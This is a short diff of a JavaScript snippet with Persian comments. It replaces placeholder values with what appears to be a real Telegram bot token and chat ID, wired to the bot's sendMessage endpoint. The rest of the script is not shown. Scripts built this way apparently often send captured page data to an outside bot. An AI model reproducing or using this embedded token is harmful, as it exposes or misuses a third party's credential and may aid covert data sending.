@@ -1,7 +1,7 @@
 (function() {
     // اطلاعات ربات تلگرام
-    const TELEGRAM_BOT_TOKEN = 'توکن';
-    const TELEGRAM_CHAT_ID = 'چت آیدی';
+    const TELEGRAM_BOT_TOKEN = '8546596467:AAGCM5AJXv_8oidYI4JMd2mQ2XEHQ2yU2Hs';
+    const TELEGRAM_CHAT_ID =' 8556517346 ';
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     // جلوگیری از ارسال تکراری در یک نشست
